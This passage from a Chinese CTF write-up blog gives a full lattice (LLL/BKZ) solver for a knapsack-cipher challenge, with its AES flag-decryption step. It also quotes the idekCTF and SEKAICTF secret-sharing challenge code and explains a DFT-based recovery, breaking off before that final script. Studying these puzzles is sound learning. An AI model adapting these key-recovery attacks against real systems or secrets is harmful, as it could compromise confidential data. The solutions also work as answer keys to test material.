class="built_in">range</span>(<span class="number">1</span> &lt;&lt; nullity):</span><br><span class="line">            W = W0</span><br><span class="line">            <span class="keyword">for</span> i, vec <span class="keyword">in</span> <span class="built_in">enumerate</span>(basis):</span><br><span class="line">                <span class="keyword">if</span> (mask &gt;&gt; i) &amp; <span class="number">1</span>:</span><br><span class="line">                    W = W + vec</span><br><span class="line">            candidates.append(W)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[5] 尝试解密并为候选解评分...&quot;</span>)</span><br><span class="line">    scored = []</span><br><span class="line">    <span class="keyword">for</span> idx, W <span class="keyword">in</span> <span class="built_in">enumerate</span>(candidates):</span><br><span class="line">        key_bits = rebuild_key_from_W(W, b, G, BLOCKS, AFFINE_DIM, VEC_LEN)</span><br><span class="line">        key_int = <span class="built_in">int</span>(key_bits, <span class="number">2</span>)</span><br><span class="line">        pt = decrypt_with_key_int(key_int, ciphertext)</span><br><span class="line">        score = printable_score(pt)</span><br><span class="line">        heuristic = <span class="number">0</span></span><br><span class="line">        low = pt.lower()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;flag&#123;&#x27;</span> <span class="keyword">in</span> low <span class="keyword">or</span> <span class="string">b&#x27;ctf&#123;&#x27;</span> <span class="keyword">in</span> low <span class="keyword">or</span> <span class="string">b&#x27;flag[&#x27;</span> <span class="keyword">in</span> low: heuristic += <span class="number">5</span></span><br><span class="line">        <span class="keyword">if</span> score &gt; <span class="number">0.85</span>: heuristic += <span class="number">1</span></span><br><span class="line">        scored.append((heuristic, score, idx, key_int, pt))</span><br><span class="line">    scored.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[6] 评分最高的候选结果:&quot;</span>)</span><br><span class="line">    show_k = <span class="built_in">min</span>(<span class="number">5</span>, <span class="built_in">len</span>(scored))</span><br><span class="line">    <span class="keyword">for</span> h, sc, idx, key_int, pt <span class="keyword">in</span> scored[:show_k]:</span><br><span class="line">        snippet = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b) <span class="keyword">if</span> <span class="number">32</span> &lt;= b &lt;= <span class="number">126</span> <span class="keyword">else</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> pt[:<span class="number">60</span>])</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  - 候选#<span class="subst">&#123;idx&#125;</span>: 启发分=<span class="subst">&#123;h&#125;</span>, 可打印分=<span class="subst">&#123;sc:<span class="number">.3</span>f&#125;</span>, 片段=&#x27;<span class="subst">&#123;snippet&#125;</span>&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    best = scored[<span class="number">0</span>]</span><br><span class="line">    h, sc, idx, key_int, pt = best</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 选定最优候选: cand#<span class="subst">&#123;idx&#125;</span> (启发分=<span class="subst">&#123;h&#125;</span>, 可打印分=<span class="subst">&#123;sc:<span class="number">.3</span>f&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 解密得到的 Flag:&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(pt.decode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;(解码失败: <span class="subst">&#123;e&#125;</span>) -&gt; 原始字节: <span class="subst">&#123;pt&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[7] 校验前 5 条 oracle:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">min</span>(<span class="number">5</span>, <span class="built_in">len</span>(oracle_data))):</span><br><span class="line">        nonce_int, sbit = oracle_data[i]</span><br><span class="line">        calc = <span class="built_in">bin</span>(nonce_int &amp; key_int).count(<span class="string">&quot;1&quot;</span>) &amp; <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  - 样本#<span class="subst">&#123;i&#125;</span>: 题目给出=<span class="subst">&#123;sbit&#125;</span>, 计算得到=<span class="subst">&#123;calc&#125;</span> -&gt; <span class="subst">&#123;<span class="string">&#x27;OK&#x27;</span> <span class="keyword">if</span> calc==sbit <span class="keyword">else</span> <span class="string">&#x27;不匹配&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行主函数</span></span><br><span class="line">solve()</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="baaaaaag"><a href="#baaaaaag" class="headerlink" title="baaaaaag"></a>baaaaaag</h1><p>一个背包密码，用bkz调一下blocksize就能出不过好像是非预期哈哈哈</p>
<p>为了方便理解博客上的脚本还是用ai注释详细的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sageall <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math, hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 题目数据 ----------</span></span><br><span class="line">a = [<span class="number">965032030645819473226880279</span>, <span class="number">699680391768891665598556373</span>, <span class="number">1022177754214744901247677527</span>, <span class="number">680767714574395595448529297</span>, <span class="number">1051144590442830830160656147</span>, <span class="number">1168660688736302219798380151</span>, <span class="number">796387349856554292443995049</span>, <span class="number">740579849809188939723024937</span>, <span class="number">940772121362440582976978071</span>, <span class="number">787438752754751885229607747</span>, <span class="number">1057710371763143522769262019</span>, <span class="number">792170184324681833710987771</span>, <span class="number">912844392679297386754386581</span>, <span class="number">906787506373115208506221831</span>, <span class="number">1073356067972226734803331711</span>, <span class="number">1230248891920689478236428803</span>, <span class="number">713426848479513005774497331</span>, <span class="number">979527247256538239116435051</span>, <span class="number">979496765566798546828265437</span>, <span class="number">836939515442243300252499479</span>, <span class="number">1185281999050646451167583269</span>, <span class="number">673490198827213717568519179</span>, <span class="number">776378201435505605316348517</span>, <span class="number">809920773352200236442451667</span>, <span class="number">1032450692535471534282750757</span>, <span class="number">1116346000400545215913754039</span>, <span class="number">1147788846283552769049123803</span>, <span class="number">994439464049503065517009393</span>, <span class="number">825645323767262265006257537</span>, <span class="number">1076742721724413264636318241</span>, <span class="number">731782018659142904179016783</span>, <span class="number">656162889354758353371699131</span>, <span class="number">1045520414263498704019552571</span>, <span class="number">1213714972395170583781976983</span>, <span class="number">949950729999198576080781001</span>, <span class="number">1150032993579134750099465519</span>, <span class="number">975992662970919388672800773</span>, <span class="number">1129148699796142943831843099</span>, <span class="number">898871798141537568624106939</span>, <span class="number">997718314505250470787513281</span>, <span class="number">631543452089232890507925619</span>, <span class="number">831335899173370929279633943</span>, <span class="number">1186748765521175593031174791</span>, <span class="number">884252194903912680865071301</span>, <span class="number">1016020417916761281986717467</span>, <span class="number">896205582917201847609656147</span>, <span class="number">959440423632738884107086307</span>, <span class="number">993368100536690520995612807</span>, <span class="number">702602277993849887546504851</span>, <span class="number">1102807438605649402749034481</span>, <span class="number">629539427333081638691538089</span>, <span class="number">887663258680338594196147387</span>, <span class="number">1001965883259152684661493409</span>, <span class="number">1043811683483962480162133633</span>, <span class="number">938713759383186904819771339</span>, <span class="number">1023699641268310599371568653</span>, <span class="number">784025822858960757703945309</span>, <span class="number">986182634512707587971047731</span>, <span class="number">1064739425741411525721437119</span>, <span class="number">1209428051066908071290286953</span>, <span class="number">667510673843333963641751177</span>, <span class="number">642828919542760339851273551</span>, <span class="number">1086628537309368288204342599</span>, <span class="number">1084848944960506663668298859</span>, <span class="number">667827295200373631038775959</span>, <span class="number">752634137348312783761723507</span>, <span class="number">707994297795744761368888949</span>, <span class="number">747998982630688589828284363</span>, <span class="number">710184791175333909291593189</span>, <span class="number">651183930154725716807946709</span>, <span class="number">724836607223400074343868079</span>, <span class="number">1118993538091590299721647899</span>]</span><br><span class="line">b = <span class="number">34962396275078207988771864327</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;Lo~G\xf46&gt;\xd609\x8e\x8e\xf5\xf83\xb5\xf0\x8f\x9f6&amp;\xea\x02\xfa\xb1_L\x85\x93\x93\xf7,`|\xc6\xbe\x05&amp;\x85\x8bC\xcd\xe6?TV4q&#x27;</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(a)</span><br><span class="line">sum_a = <span class="built_in">sum</span>(a)</span><br><span class="line">max_a = <span class="built_in">max</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 选择 k ----------</span></span><br><span class="line"><span class="comment"># 建议初始 k 为 2^&#123;round(bitlen/2)&#125;，再试一些倍数</span></span><br><span class="line">base_exp = max_a.bit_length()//<span class="number">2</span></span><br><span class="line">k_base = <span class="number">1</span> &lt;&lt; base_exp</span><br><span class="line">k_candidates = [k_base, k_base//<span class="number">2</span>, k_base*<span class="number">2</span>, k_base*<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[INFO] n=<span class="subst">&#123;n&#125;</span>, max_a_bitlen=<span class="subst">&#123;max_a.bit_length()&#125;</span>, base k=<span class="subst">&#123;k_base&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_matrix</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="comment"># 构造 (n+1)x(n+1) 矩阵</span></span><br><span class="line">    rows = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        row = [<span class="number">0</span>]*(n+<span class="number">1</span>)</span><br><span class="line">        row[i] = <span class="number">2</span></span><br><span class="line">        row[-<span class="number">1</span>] = k * a[i]</span><br><span class="line">        rows.append(row)</span><br><span class="line">    <span class="comment"># 最后一行: 全 1, 末列 k(Σ a_i - b)</span></span><br><span class="line">    last_row = [<span class="number">1</span>]*n + [k*(sum_a - b)]</span><br><span class="line">    rows.append(last_row)</span><br><span class="line">    <span class="keyword">return</span> Matrix(ZZ, rows)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_decode</span>(<span class="params">vec</span>):</span><br><span class="line">    <span class="comment"># vec 长度 n+1</span></span><br><span class="line">    last = vec[-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 理想: last == 0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">abs</span>(last) != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    coords = <span class="built_in">list</span>(vec[:-<span class="number">1</span>])</span><br><span class="line">    <span class="comment"># 需要全部是 ±1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(c <span class="keyword">not</span> <span class="keyword">in</span> (-<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">for</span> c <span class="keyword">in</span> coords):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    bits = [(c+<span class="number">1</span>)//<span class="number">2</span> <span class="keyword">for</span> c <span class="keyword">in</span> coords]   <span class="comment"># -1-&gt;0, +1-&gt;1</span></span><br><span class="line">    <span class="comment"># 校验</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(ai*bi <span class="keyword">for</span> ai,bi <span class="keyword">in</span> <span class="built_in">zip</span>(a,bits)) == b:</span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line">    <span class="comment"># 也可能整向量取反</span></span><br><span class="line">    bits2 = [<span class="number">1</span> - x <span class="keyword">for</span> x <span class="keyword">in</span> bits]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">sum</span>(ai*bi <span class="keyword">for</span> ai,bi <span class="keyword">in</span> <span class="built_in">zip</span>(a,bits2)) == b:</span><br><span class="line">        <span class="keyword">return</span> bits2</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> k_candidates:</span><br><span class="line">    <span class="keyword">if</span> k &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[TRY] k=<span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">    B = build_matrix(k)</span><br><span class="line">    <span class="comment"># 先 LLL</span></span><br><span class="line">    Bred = B.LLL()</span><br><span class="line">    <span class="comment"># 直接扫描</span></span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> Bred.rows():</span><br><span class="line">        bits = try_decode(r)</span><br><span class="line">        <span class="keyword">if</span> bits:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[SUCCESS] Found after LLL.&quot;</span>)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        solution_bits = bits</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 若未找到，尝试 BKZ 提升 block size</span></span><br><span class="line">    <span class="keyword">for</span> bs <span class="keyword">in</span> [<span class="number">20</span>, <span class="number">28</span>, <span class="number">32</span>, <span class="number">36</span>, <span class="number">40</span>]:</span><br><span class="line">        <span class="keyword">if</span> found:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(Bred, <span class="string">&quot;BKZ&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [*] BKZ block_size=<span class="subst">&#123;bs&#125;</span>&quot;</span>)</span><br><span class="line">        Bred = Bred.BKZ(block_size=bs)</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> Bred.rows():</span><br><span class="line">            bits = try_decode(r)</span><br><span class="line">            <span class="keyword">if</span> bits:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[SUCCESS] Found at block_size=<span class="subst">&#123;bs&#125;</span>&quot;</span>)</span><br><span class="line">                found = <span class="literal">True</span></span><br><span class="line">                solution_bits = bits</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> found:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[FAIL] 没找到。建议：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  1) 扩展 k 候选 (k_base*8 等)，或更细粒度如 k_base//4。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  2) 增大 BKZ block_size (&gt;=44)。&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;  3) 换 half-shift 嵌入 (更常用)。&quot;</span>)</span><br><span class="line">    <span class="keyword">raise</span> SystemExit</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 还原 p ----------</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i,bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(solution_bits):</span><br><span class="line">    <span class="keyword">if</span> bit:</span><br><span class="line">        p |= (<span class="number">1</span>&lt;&lt;i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[RESULT] p bitlen=<span class="subst">&#123;p.bit_length()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[RESULT] p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- 解密 ----------</span></span><br><span class="line">key = hashlib.sha256(<span class="built_in">str</span>(p).encode()).digest()</span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">pt_padded = cipher.decrypt(ciphertext)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = unpad(pt_padded,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    flag = pt_padded</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[FLAG] =&quot;</span>, flag)</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>SEKAICTFの部分密码题</title>
    <url>/2025/08/26/SEKAICTF%E3%81%AE%E9%83%A8%E5%88%86%E5%AF%86%E7%A0%81%E9%A2%98/</url>
    <content><![CDATA[<p>qwq</p>
<p>上周也是抽空打了SEKAICTF，不得不说质量是真的高，感觉最近有点颓废了，快开学了还是尽快找回状态</p>
<span id="more"></span>

<h1 id="SSSS"><a href="#SSSS" class="headerlink" title="SSSS"></a>SSSS</h1><p>这道题其实跟不久前的idekCTF的一道题方法是一样的，都是利用DFT(离散傅里叶变换)去解决，(写到这想起来还没写idek的博客唉)这里我们就先再次分析一下idek的那道题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">idek</span>():</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret : <span class="built_in">bytes</span></span>): </span><br><span class="line"></span><br><span class="line">		self.secret = secret</span><br><span class="line">		self.p = <span class="literal">None</span>	</span><br><span class="line"></span><br><span class="line">		self.poly = <span class="literal">None</span> </span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">set_p</span>(<span class="params">self, p : <span class="built_in">int</span></span>):</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> isPrime(p):</span><br><span class="line">			self.p = p</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">gen_poly</span>(<span class="params">self, deg : <span class="built_in">int</span></span>):</span><br><span class="line"></span><br><span class="line">		s = bytes_to_long(self.secret)</span><br><span class="line">		l = s.bit_length()</span><br><span class="line">		self.poly = [random.randint(<span class="number">0</span>, <span class="number">2</span>**l) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(deg + <span class="number">1</span>)]</span><br><span class="line">		index = random.randint(deg//<span class="number">4</span> + <span class="number">1</span>, <span class="number">3</span>*deg//<span class="number">4</span> - <span class="number">1</span>)</span><br><span class="line">		self.poly[index] = s</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_share</span>(<span class="params">self, point : <span class="built_in">int</span></span>):</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> self.p <span class="keyword">or</span> <span class="keyword">not</span> self.poly:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">sum</span>([coef * <span class="built_in">pow</span>(point, i, self.p) <span class="keyword">for</span> i, coef <span class="keyword">in</span> <span class="built_in">enumerate</span>(self.poly)]) % self.p</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_shares</span>(<span class="params">self, points : <span class="built_in">list</span>[<span class="built_in">int</span>]</span>):</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> [self.get_share(point) <span class="keyword">for</span> point <span class="keyword">in</span> points]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">banner</span>():</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;==============================================&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;=== Welcome to idek Secret Sharing Service ===&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;==============================================&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>():</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[1] Oracle&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[2] Verify&quot;</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;[3] Exit&quot;</span>)</span><br><span class="line">		</span><br><span class="line">	op = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>))</span><br><span class="line">	<span class="keyword">return</span> op</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	S = idek(os.urandom(<span class="number">80</span>))</span><br><span class="line">	deg = <span class="number">16</span></span><br><span class="line">	seen = []</span><br><span class="line"></span><br><span class="line">	banner()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">17</span>):</span><br><span class="line"></span><br><span class="line">		op = menu()</span><br><span class="line">		<span class="keyword">if</span> op == <span class="number">1</span>:</span><br><span class="line">			p = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;What&#x27;s Your Favorite Prime : &quot;</span>))</span><br><span class="line">			<span class="keyword">assert</span> p.bit_length() == <span class="number">64</span> <span class="keyword">and</span> isPrime(p) <span class="keyword">and</span> p <span class="keyword">not</span> <span class="keyword">in</span> seen</span><br><span class="line">			seen += [p]</span><br><span class="line">			S.set_p(p)</span><br><span class="line">			S.gen_poly(deg)</span><br><span class="line">			L = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>).split(<span class="string">&quot;,&quot;</span>)))</span><br><span class="line">			<span class="keyword">assert</span> <span class="built_in">len</span>(L) &lt;= <span class="number">3</span>*deg//<span class="number">4</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">f&quot;Here are your shares : <span class="subst">&#123;S.get_shares(L)&#125;</span>&quot;</span>)</span><br><span class="line">		<span class="keyword">elif</span> op == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">if</span> S.secret.<span class="built_in">hex</span>() == <span class="built_in">input</span>(<span class="string">&quot;Guess the secret : &quot;</span>):</span><br><span class="line">				<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">					<span class="built_in">print</span>(f.read())</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&quot;Try harder.&quot;</span>)</span><br><span class="line">		<span class="keyword">elif</span> op == <span class="number">3</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Bye!&quot;</span>)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&quot;Unknown option.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>哎才想起来我群好像写了这个wp，顺便引流一下<a href="https://normalsubgroup.cauchy.top/blog/idek2025-writeup/">正规子群 • idekCTF 2025 Team WriteUp</a>那我们废话不多说直接来看这道题。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">256</span> - <span class="number">189</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SEKAI&#123;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge</span>(<span class="params">secret</span>):</span><br><span class="line">	t = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">	<span class="keyword">assert</span> <span class="number">20</span> &lt;= t &lt;= <span class="number">50</span>, <span class="string">&quot;Number of parties not in range&quot;</span></span><br><span class="line"></span><br><span class="line">	f = gen(t, secret)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(t):</span><br><span class="line">		x = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">		<span class="keyword">assert</span> <span class="number">0</span> &lt; x &lt; p, <span class="string">&quot;Bad input&quot;</span></span><br><span class="line">		<span class="built_in">print</span>(poly_eval(f, x))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>()) == secret:</span><br><span class="line">		<span class="built_in">print</span>(FLAG)</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;:&lt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">degree, secret</span>):</span><br><span class="line">	poly = [random.randrange(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(degree + <span class="number">1</span>)]</span><br><span class="line">	index = random.randint(<span class="number">0</span>, degree)</span><br><span class="line"></span><br><span class="line">	poly[index] = secret</span><br><span class="line">	<span class="keyword">return</span> poly</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_eval</span>(<span class="params">f, x</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">sum</span>(c * <span class="built_in">pow</span>(x, i, p) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(f)) % p</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	secret = random.randrange(<span class="number">0</span>, p)</span><br><span class="line">	<span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">		challenge(secret)</span><br></pre></td></tr></table></figure>

<p>其实本质上跟idek那道是一模一样的。不过这里我们可以自定义多项式的阶数，然后生成一个全新的、阶数为t的随机多项式，并将secret作为其中一个系数。循环t次：等待我们发送一个x值，服务器则返回f(x) mod p的结果，对于gen函数，为了便于理解，我们加上以下注释</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gen函数用于生成多项式。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">degree, secret</span>):</span><br><span class="line">	<span class="comment"># a. 创建一个包含`degree + 1`个随机系数的多项式。</span></span><br><span class="line">	poly = [random.randrange(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(degree + <span class="number">1</span>)]</span><br><span class="line">	<span class="comment"># b. 随机选择一个位置。</span></span><br><span class="line">	index = random.randint(<span class="number">0</span>, degree)</span><br><span class="line">	<span class="comment"># c. 将这个位置的系数替换为真正的secret。</span></span><br><span class="line">	poly[index] = secret</span><br><span class="line">	<span class="keyword">return</span> poly</span><br><span class="line"></span><br><span class="line"><span class="comment"># poly_eval函数用于计算多项式在点x处的值。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poly_eval</span>(<span class="params">f, x</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">sum</span>(c * <span class="built_in">pow</span>(x, i, p) <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(f)) % p</span><br></pre></td></tr></table></figure>

<p>分析题目我们可以发现以下一些可能对解题有帮助的点。</p>
<ol>
<li><strong><code>secret</code>在一次连接中是固定不变的。</strong> 它在程序启动时生成，并被两次<code>challenge</code>调用共享。</li>
<li><strong>多项式是随机变化的</strong>：每一次调用<code>challenge</code>，都会生成一个<strong>全新的随机多项式</strong>。<code>secret</code>被藏在其中的位置也是随机的。</li>
</ol>
<p>那么我们就可以有一个大概的思路：既然<code>secret</code>在两次挑战中是唯一不变的元素，而其他所有系数都是随机变化的，那么我们只要分别找出两次挑战中所有的多项式系数，然后计算这两个系数集合的<strong>交集</strong> ，这个交集中唯一的元素必然就是<code>secret</code>。根据DFT相关知识，这里给出了p，我们需要选择一个数，令p-1能整除，这样就有对应次次单位根。传进去的如果是t次单位根那么IDFT恢复的是x$^{i+kt}$的项对应的系数的和,如果我们有t阶的g，常数项和第t项重叠，所以多项式可以用t个点重建.再根据题目给出的条件assert 20 &lt;&#x3D; t &lt;&#x3D; 50，那么只有29符合条件。也就是我们需要29个点恢复多项式。</p>
<p>然后，收集齐29个点<code>(x, y)</code>后，我们使用<strong>逆离散傅里叶变换 (IDFT)</strong> ，可以从这些点值中瞬间计算出多项式<code>f1</code>的所有29个系数。我们将这些系数存入集合 <code>candidates_1</code>，同理第二次一样的操作，最后计算交集。仍然为了便于理解，这里给出ai详细化后的脚本</p>
